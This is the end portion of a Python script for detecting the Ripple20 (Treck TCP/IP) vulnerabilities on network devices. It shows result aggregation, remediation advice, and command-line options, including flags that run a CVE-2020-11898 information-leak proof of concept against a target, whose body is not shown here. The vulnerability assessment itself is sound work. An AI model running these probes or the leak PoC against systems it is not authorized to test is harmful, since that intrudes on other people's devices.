        if checks_to_run and name not in checks_to_run:
            continue
        log.info(f"Running: {name}")
        result = check_fn()
        report.checks.append(result)
        log.info(f"  -> {result.status} (confidence {result.confidence:.0%})")

    # --- Aggregate ---
    positive = [c for c in report.checks if c.status in ("LIKELY_VULNERABLE", "POSSIBLE")]
    report.treck_stack_indicators = len(positive)

    if report.checks:
        max_conf = max(c.confidence for c in report.checks)
        avg_conf = sum(c.confidence for c in report.checks) / len(report.checks)
        # Weight toward the max but factor in breadth
        report.overall_confidence = round(min((max_conf * 0.6 + avg_conf * 0.4), 1.0), 2)
    else:
        report.overall_confidence = 0.0

    likely = any(c.status == "LIKELY_VULNERABLE" for c in report.checks)
    possible = any(c.status == "POSSIBLE" for c in report.checks)

    if likely and report.treck_stack_indicators >= 2:
        report.overall_status = "LIKELY_VULNERABLE"
        report.recommendation = (
            "Multiple indicators suggest the Treck TCP/IP stack is present. "
            "Confirm firmware version with the device vendor and apply patches "
            "or mitigations per JSOF advisory (https://www.jsof-tech.com/ripple20/). "
            "Consider network segmentation and IDS rules as immediate mitigations."
        )
    elif likely or (possible and report.treck_stack_indicators >= 2):
        report.overall_status = "POSSIBLE"
        report.recommendation = (
            "Some indicators suggest the Treck stack may be present. "
            "Verify the device firmware and vendor advisories. Monitor traffic "
            "for anomalous IP-in-IP or DNS patterns. Apply vendor patches if available."
        )
    else:
        report.overall_status = "NOT_DETECTED"
        report.recommendation = (
            "No strong indicators of the Treck TCP/IP stack were detected. "
            "This does not guarantee the absence of Ripple20 vulnerabilities. "
            "Check vendor advisories for definitive confirmation."
        )

    return report


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="Ripple20 (Treck TCP/IP) Vulnerability Verification Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 ripple20.py --target 192.168.1.100
  sudo python3 ripple20.py --target 10.0.0.50 --port 443 --timeout 10
  sudo python3 ripple20.py --target 172.16.0.1 --json --output report.json
  sudo python3 ripple20.py --target 10.0.0.50 --checks tcp_fingerprint icmp_behavior
  sudo python3 ripple20.py --target 192.168.1.100 --confirm
  sudo python3 ripple20.py --target 10.0.0.50 --force-confirm
  sudo python3 ripple20.py --target-file targets.txt --json --output report.json
        """,
    )
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("--target", "-t", help="Target IP address")
    target_group.add_argument("--target-file", "-f", help="File containing target IP addresses (one per line)")
    parser.add_argument("--port", "-p", type=int, default=80, help="TCP port for fingerprinting (default: 80)")
    parser.add_argument("--timeout", type=int, default=5, help="Packet timeout in seconds (default: 5)")
    parser.add_argument("--json", action="store_true", help="Output report in JSON format")
    parser.add_argument("--output", "-o", help="Save report to file")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose/debug logging")
    parser.add_argument(
        "--checks",
        nargs="+",
        choices=["tcp_fingerprint", "ip_in_ip", "icmp_behavior", "dns_anomaly", "tcp_urgent"],
        help="Run only specific checks (default: all)",
    )
    parser.add_argument(
        "--confirm", action="store_true",
        help="Run CVE-2020-11898 info leak PoC if target is LIKELY_VULNERABLE or POSSIBLE",
    )
    parser.add_argument(
        "--force-confirm", action="store_true",
        help="Run CVE-2020-11898 info leak PoC regardless of verification result",
    )
    return parser.parse_args()


def validate_target(target: str) -> str:
    """Validate that a target string is a valid IP address. Returns the normalized IP string."""
    try:
        return str(ipaddress.ip_address(target))
    except ValueError:
        print(f"ERROR: Invalid IP address: '{target}'", file=sys.stderr)
        sys.exit(1)


def load_targets(target_file: str) -> list:
    """Load IP addresses from a file, one per line. Ignores blank lines and comments (#)."""
    targets = []
    try:
        with open(target_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(validate_target(line))
    except OSError as e:
        print(f"ERROR: Cannot read target file '{target_file}': {e}", file=sys.stderr)
        sys.exit(1)
    if not targets:
        print(f"ERROR: No targets found in '{target_file}'.", file=sys.stderr)
        sys.exit(1)
    return targets


def main():
    args = parse_args()

    if not SCAPY_AVAILABLE:
        print("ERROR: scapy is required. Install with:  pip install scapy", file=sys.stderr)
        sys.exit(1)

    if os.geteuid() != 0:
        print("ERROR: This script requires root privileges. Run with sudo.", file=sys.stderr)
        sys.exit(1)

    if args.verbose:
        log.setLevel(logging.DEBUG)

    # Suppress scapy warnings
    conf.verb = 0

    targets = [validate_target(args.target)] if args.target else load_targets(args.target_file)

    reports = []
    for target in targets:
        print(f"\n{'=' * 72}")
        print(f"  Ripple20 Verification — Target: {target}:{args.port}")
        print(f"{'=' * 72}\n")

        report = run_verification(
            target=target,
            port=args.port,
            timeout=args.timeout,
            checks_to_run=args.checks,
        )

        # Run confirmation PoC if requested
        should_confirm = args.force_confirm or (
            args.confirm and report.overall_status in ("LIKELY_VULNERABLE", "POSSIBLE")
        )
        if should_confirm:
            print(f"\n  Running CVE-2020-11898 info leak confirmation PoC...\n")
            report.confirmation = confirm_info_leak(target, args.timeout)
            log.info(f"  -> Confirmation: {report.confirmation.status}")

        reports.append(report)

        if not args.json:
            print(generate_report(report))

    if args.json:
        if len(reports) == 1:
            output = generate_json_report(reports[0])
        else:
            output = json.dumps(
                [json.loads(generate_json_report(r)) for r in reports], indent=2
            )
        print(output)

    if args.output:
        if args.json:
            if len(reports) == 1:
                content = generate_json_report(reports[0])
            else:
                content = json.dumps(
                    [json.loads(generate_json_report(r)) for r in reports], indent=2
                )
        else:
            content = "\n".join(generate_report(r) for r in reports)
        with open(args.output, "w") as f:
            f.write(content)
        print(f"\nReport saved to: {args.output}")

    # Exit code: 2=likely vuln, 1=possible, 0=not detected (worst across all targets)
    statuses = [r.overall_status for r in reports]
    if "LIKELY_VULNERABLE" in statuses:
        sys.exit(2)
    elif "POSSIBLE" in statuses:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()s